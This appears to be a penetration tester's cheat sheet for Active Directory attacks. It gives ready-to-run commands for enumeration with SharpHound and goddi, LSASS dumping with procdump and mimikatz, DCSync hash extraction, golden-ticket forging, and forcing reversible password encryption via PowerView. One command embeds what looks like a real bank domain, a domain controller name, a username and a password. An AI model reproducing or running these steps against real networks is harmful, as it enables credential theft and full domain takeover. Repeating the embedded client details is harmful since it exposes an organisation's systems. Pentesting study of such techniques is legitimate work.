Running sharphound 

runas.exe /netonly /user:completedomainname\userid cmd.exe         complete fqdn eg. domainname.local

SharpHound.exe -c All -d sbmbank.local --IgnoreLdapCert -v




Running goddi 

goddi-windows-amd64.exe  -dc="MUMSBMADS2.sbmbank.local" -domain="sbmbank.local" -username="IA80000" -password="P@ssword"  -unsafe


PinCastle for Active directory audit.  
Scan Open shares 


Lazesoft for getting local admin credentials from the PC 

Lazesoft-Recover-My-Password-Home  

https://www.lazesoft.com/forgot-windows-admin-password-recovery-freeware.html

****************************************************************************
getting dump 

C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz

mimikatz # sekurlsa::minidump lsass2.dmp <br>
mimikatz # sekurlsa::logonPasswordsfull


**************************************************************************


ntds.dit getting hashes of users

Run from the context of the domain admin

lsadump::dcsync /domain:pentestlab.local /all /csv



lsadump::dcsync /domain:pentestlab.local /user:test <br>
By specifying the domain username with the /user parameter Mimikatz can dump all the account information of this particular user including his password hash.


****************************************************************************************************
Creating golden ticket

We can run these commands from a non domain administrator 

commands to run from mimikatz <br>
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e
/ticket:evil.tck /ptt


the string after krbtgt i.e. 'd125e4f69c851529045ec95ca80fa37e' is the ntml hash that we get after running the lsadump command in mimikatz

come out of mimikatz and run the command <br> 
<b> <i>klist  </i></b>

This will list all the tickets

you can now use pushd or psexec  to login to the domain controller from the current session using the golden ticket

psexec.exe \\adserver.domainame\ cmd.exe  <br>
pushd \\adserver.domainname\ 


Reference links :
https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets  <br>
https://adsecurity.org/?p=1515    ( Detecting forged kerberos tickets) 

*****************************************************************************

mitm 6

https://github.com/fox-it/mitm6

pip install -r requirements.txt <br>
pip install mitm6   or python setup.py install <br>



********************************************************************************

Responder links 

https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/ <br>
https://blog.geoda-security.com/2018/11/gaining-foothold-using-responder-and.html     ( using responder ntlmrelayx and empire ) 
 



************************************************************************************

forcing reversible encryption on user accounts

lsadump::dcsync /domain:pentestlab.local /user:test

when we run the above command we get the ntml hashes. However, we can get clear text credentials if the password is configured as reversible encryption. however, reversible encryption is generally disabled by the gpo. We can force reversible encryption on a user by using a powershell script from PowerView 
Note: we need to have domain admin credentials to be able to run the script successfully. We need to run the script once the user is locked. If the user is running the downgrade does not work. 

if we are running from a non domain system use runas using the domain admin credentials. 

We will download powerview and import the module <br>
<b>Import-Module powerview.psm1 </b>

We then run the command <br>
<b>Invoke-Downgrade -SamAccountName username which is to be downgraded  </b>


The script does the following 


 DONT_EXPIRE_PASSWORD is set, we need to flip that with Set-ADObject -SamAccountName USER -PropertyName useraccountcontrol -PropertyXorValue 65536.

Then we can set ENCRYPTED_TEXT_PWD_ALLOWED with Set-ADObject -SamAccountName USER -PropertyName useraccountcontrol -PropertyXorValue 128.

We can then manually set pwdlastset to 0, which forces the user to change their password on next login Set-ADObject -SamAccountName USER -PropertyName pwdlastset -PropertyValue 0.

Now the user will be forced to change the password once he logs in. Once the user changes the password it will be stored in reversible encrytion form in the ad database 

WE can now run the 

lsadump::dcsync /domain:pentestlab.local /user:test and we will get credentials 

Invoke-Downgrade -SamAccountName username -Repair 



<b>Imp links: </b>

https://www.harmj0y.net/blog/redteaming/targeted-plaintext-downgrades-with-powerview/  <br>
https://github.com/PowerShellEmpire/PowerTools<br>
https://www.c0d3xpl0it.com/2018/06/active-directory-attack-dcsync.html<br>
